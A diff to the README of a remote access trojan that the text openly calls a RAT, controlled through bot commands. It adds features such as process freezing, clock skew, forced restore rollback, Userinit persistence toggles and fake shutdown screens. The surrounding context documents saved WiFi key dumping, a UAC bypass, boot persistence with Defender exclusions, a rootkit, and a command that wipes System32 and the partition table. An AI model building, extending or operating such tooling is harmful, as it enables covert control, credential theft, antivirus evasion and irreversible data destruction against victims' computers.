@@ -149,6 +149,7 @@ Everything runs on a daemon thread, so the bot stays responsive while the screen
 |---|---|
 | `.block-input [seconds]` | Freeze keyboard + mouse for N seconds (or permanently). |
 | `.unblock-input` | Release a permanent input block. |
+| `.freeze` | Hard-freeze the session: suspend user processes and hold the input layer until it is released. |
 | `.show-cursor` / `.hide-cursor` | Show or hide the cursor. |
 | `.crazy-mouse` | Jiggle the mouse randomly for 2 seconds. |
 | `.key <keys>` | Press keys — supports tokens like `[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`. |
@@ -182,6 +183,9 @@ Everything runs on a daemon thread, so the bot stays responsive while the screen
 | `.blacklist <proc>` / `.unblacklist <proc>` | Block a process from running, via a WMI process-start watcher. |
 | `.idle-time` | Report how long the user has been idle. |
 | `.set-date <date>` / `.set-hour <time>` | Change system date/time. |
+| `.clockskew <seconds>` | Shift the system clock by an offset, forwards or backwards, in one call. |
+| `.restore-point` | Create a System Restore checkpoint. |
+| `.restorenow` | Immediately roll the system back to the most recent restore point. |
 | `.deactivate-windows` | Deactivate Windows. |
 | `.clear-bin` | Empty the recycle bin. |
 | `.services` | List running services. |
@@ -192,7 +196,6 @@ Everything runs on a daemon thread, so the bot stays responsive while the screen
 | `.beep` | Emit a system beep. |
 | `.notepad [text]` | Open Notepad (optionally pre-filled). |
 | `.godmode` | Create a GodMode folder on the desktop. |
-| `.restore-point` | Create a System Restore checkpoint. |
 
 ## 🔬 Hardware & system inventory
 
@@ -200,11 +203,12 @@ Everything runs on a daemon thread, so the bot stays responsive while the screen
 |---|---|
 | `.sysinfo` / `.systeminfo` | Live CPU/RAM/disk usage, and the raw `systeminfo` dump. |
 | `.gpu` / `.cpu` / `.motherboard` / `.bios` | GPU, CPU, baseboard and BIOS details. |
-| `.disks` / `.volumes` / `.partition` | Physical disks, volumes and partitions. |
+| `.disks` / `.volumes` / `.partition` / `.disk` | Physical disks, volumes, partitions and a one-shot disk summary. |
 | `.drives` / `.battery` / `.uptime` / `.sysclock` | Drives, battery, uptime and system clock. |
 | `.temp` | Thermal zone temperatures. |
 | `.whoami` / `.env` / `.sessions` / `.users` | Identity, environment, sessions, local accounts. |
-| `.hotfix` / `.antivirus` / `.drivers` / `.events` | Hotfixes, registered AV, drivers, event log. |
+| `.hotfix` / `.antivirus` / `.events` | Hotfixes, registered AV, event log. |
+| `.drivers` / `.drvlist` | Installed kernel drivers, with a short alias for the same dump. |
 | `.wifi` | Dump every saved WiFi profile with its key. |
 | `.perf` / `.pstree` / `.boot-info` | Load, process tree, boot time and uptime. |
 
@@ -263,6 +267,7 @@ Everything runs on a daemon thread, so the bot stays responsive while the screen
 | `.admin-check` | Report whether the RAT has admin rights. |
 | `.ask-admin` | Request admin via a UAC prompt. |
 | `.uac-bypass` | Attempt a UAC bypass for elevation. |
+| `.install-userinit` / `.uninstall-userinit` | Install or remove the `Userinit` persistence entry on its own. |
 | *(startup)* | **Persistence + UAC bypass at boot**, out of the box: two clone slots, a `Userinit` entry, two scheduled tasks, a self-healing watchdog batch and Defender exclusions. |
 
 ## 💾 Disk-level persistence (rootkit)
@@ -327,6 +332,7 @@ The stub is 16-bit real mode: relocates itself to `0x0600`, re-reads the origina
 | `.jumpscare` | Trigger a fullscreen jumpscare with audio. |
 | `.display-glitch [graphic]` | Paint a GDI glitch over the desktop (41 effects). |
 | `.fake-bsod` / `.fake-lock` / `.fake-update` | Fullscreen fakes. |
+| `.fakeshutdown` | Fullscreen "shutting down" screen that never finishes. |
 | `.black-screen [seconds]` | Black overlay. |
 | `.caps-roulette [s]` / `.volume-roulette [s]` | Random Caps Lock, random volume. |
 | `.numlock-spam [n]` / `.window-shake [n]` / `.taskbar-dance [n]` | Repetitive annoyance. |
@@ -366,10 +372,12 @@ The stub is 16-bit real mode: relocates itself to `0x0600`, re-reads the origina
 | Command | What it does |
 |---|---|
 | `.lock-pc` / `.sleep-pc` | Lock the workstation, send it to sleep. |
-| `.restart-pc` / `.shutdown-pc` | Restart or shut down. |
+| `.restart-pc` / `.shutdown-pc` / `.shutdown` | Restart or shut down, with a short alias for shutdown. |
 | `.sched-shutdown <seconds>` | Delayed shutdown, 5 s to 24 h. |
+| `.cancel` | Abort a pending scheduled shutdown or restart. |
 | `.kill-pc` → `.confirm-kill` | Purge AV, kill recovery, delete the BCD store, wipe user data + System32, nuke the partition table → **unbootable** (cannot be undone). |
 | `.implode` | Self-destruct, leaving no evidence. |
+| `.uninstall` | Clean removal: persistence, both tasks, `Userinit` entry, clones and Defender exclusions. |
 | `.exit` | Close the RAT until reboot or forced reopen. |
 | `.update` | Push a newer compiled build via an attached file. |
 
@@ -581,6 +589,15 @@ A mode the panel doesn't support got applied. Reboot, or set a known-good resolu
 
 **`.display-glitch` did nothing.**
 The effect name must match exactly; run `.display-glitch list`. Some effects depend on the desktop compositor being active.
+
+**`.freeze` locked everything and the bot won't answer.**
+The freeze holds user processes, not the bot's own session thread. If the bot goes quiet too, the target was suspended too deep — reboot, then check that `.unfreeze`/`.unblock-input` isn't still armed.
+
+**`.restorenow` failed.**
+System Protection must already be enabled and at least one restore point must exist. Create one first with `.restore-point`, and note that a rollback restarts the machine and wipes the RAT's persistence if it was installed after the point.
+
+**`.uninstall` left traces.**
+Run it elevated. It removes the tasks, the `Userinit` entry, both clone slots and the exclusions, but it does not touch `.rootkit` layers — run `.rootkit clean` first if you used them.
 
 **Compile fails on dependencies.**
 Update `pip` (`python -m pip install --upgrade pip`) and re-run the `.bat`. Ensure you're on a real Windows machine, not Wine.
